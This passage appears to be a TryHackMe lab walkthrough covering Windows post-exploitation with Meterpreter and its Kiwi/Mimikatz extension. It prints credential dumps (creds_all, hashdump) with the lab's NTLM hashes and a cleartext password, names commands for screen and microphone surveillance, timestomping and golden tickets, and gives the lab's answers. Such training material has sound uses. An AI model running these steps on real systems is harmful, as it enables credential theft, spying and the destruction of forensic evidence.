+Priv: Timestomp Commands
+========================
+
+    Command                   Description
+    -------                   -----------
+    timestomp                 Manipulate file MACE attributes
+
+
+Kiwi Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    creds_all                 Retrieve all credentials (parsed)
+    creds_kerberos            Retrieve Kerberos creds (parsed)
+    creds_livessp             Retrieve Live SSP creds
+    creds_msv                 Retrieve LM/NTLM creds (parsed)
+    creds_ssp                 Retrieve SSP creds
+    creds_tspkg               Retrieve TsPkg creds (parsed)
+    creds_wdigest             Retrieve WDigest creds (parsed)
+    dcsync                    Retrieve user account information via
+                              DCSync (unparsed)
+    dcsync_ntlm               Retrieve user account NTLM hash, SID a
+                              nd RID via DCSync
+    golden_ticket_create      Create a golden kerberos ticket
+    kerberos_ticket_list      List all kerberos tickets (unparsed)
+    kerberos_ticket_purge     Purge any in-use kerberos tickets
+    kerberos_ticket_use       Use a kerberos ticket
+    kiwi_cmd                  Execute an arbitrary mimikatz command
+                              (unparsed)
+    lsa_dump_sam              Dump LSA SAM (unparsed)
+    lsa_dump_secrets          Dump LSA secrets (unparsed)
+    password_change           Change the password/hash of a user
+    wifi_list                 List wifi profiles/creds for the curre
+                              nt user
+    wifi_list_shared          List shared wifi profiles/creds (requi
+                              res SYSTEM)
+
+For more info on a specific command, use <command> -h or help <command>.
+
+
+
+[5.7. WHICH COMMAND ALLOWS UP TO RETRIEVE ALL CREDENTIALS?]
+[ANSWER (based on last output)]
+creds_all
+
+
+
+[5.8. RUN THIS COMMAND NOW- WHAT IS DARK'S PASSWORD? MIMIKATZ ALLOWS US TO STEAL THIS PASSWORD OUT OF MEMORY EVEN WITHOUT THE USER 'Dark' LOGGED IN AS THERE IS A SCHEDULED TASK THAT RUNS THE ICECAST AS THE USER 'Dark'. IT ALSO HELPS THAT WINDOWS DEFENDER ISN'T RUNNING ON THE BOX ;) (TAKE A LOOK AGAIN AT THE PS LIST, THIS BOX ISN'T IN THE BEST WITH BOTH THE FIREWALL AND DEFENDER DISABLED)]
+[ACTION: dump all credentials]
+creds_all
+[OUTPUT]
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain   LM               NTLM             SHA1
+--------  ------   --               ----             ----
+Dark      Dark-PC  e52cac67419a9a2  7c4fe5eada68271  0d082c4b4f2aeaf
+                   2ecb08369099ed3  4a036e39378362b  b67fd0ea568a997
+                   02               ab               e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+[ANSWER]
+Password01!
+[NOTE]
+For some reason, thm doesn't leave an extra digit for the ! in the answer field.
+
+
+
+
+[>>> TASK 6: POST-EXPLOITATION]
+[6.1. BEFORE WE START OUR POST-EXPLOITATION, LET'S REVISIT THE HELP MENU ONE LAST TIME IN THE METERPRETER SHELL. WE'LL ANSWER OUR FOLLOWING QUESTIONS USING THAT MENU]
+Nothing to do here.
+
+
+
+[6.2. WHAT COMMAND ALLOWS US TO DUMP ALL OF THE PASSWORD HASHES STORED ON THE SYSTEM? WE WON'T CRACK THE ADMINISTRATIVE PASSWORD IN THIS CASE AS IT'S PRETTY STRONG (THIS IS INTENTIONAL TO AVOID PASSWORD SPARYING ATTEMPTS)]
+[NOTE]
+This one and following questions are answered by searching through the kiwi help page.
+[ANSWER]
+hashdump
+[OUTPUT]
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+
+[6.3. WHILE MORE USEFUL WHEN INTERACTING WITH A MACHINE BEING USED, WHAT COMMAND ALLOWS US TO WATCH THE REMOTE USER'S DESKTOP IN REAL TIME?]
+[ANSWER]
+screenshare
+
+
+[6.4. HOW ABOUT IF WE WANTED TO RECORD FROM A MICROPHONE ATTACHED TO THE SYSTEM?]
+[ANSWER]
+record_mic
+
+
+[6.5. TO COMPLETE FORENSIC EFFORTS WE CAN MODIFY TIMESTAMPS OF FILES ON THE SYSTEM. WHAT COMMAND ALLOWS US TO DO THIS? DON'T EVER DO THIS ON A PENTEST UNLES YOU'RE EXPLICITLY ALLOWED TO DO SO! THIS IS NOT BENEFICIAL TO THE DEFENDING TEAM AS THEY TRY TO BREAK DOWN THE EVENTS OF THE PENTEST AFTER THE FACT]
+[ANSWER]
+timestomp
+
+
+
+[6.6. MIMIKATZ ALLOWS US TO CREATE WHAT'S CALLED A `golden ticket`, ALLOWING US TO AUTHENTICATE ANYWHERE WITH EASE. WHAT COMMAND ALLOWS US TO DO THIS?]
+golden_ticket_create
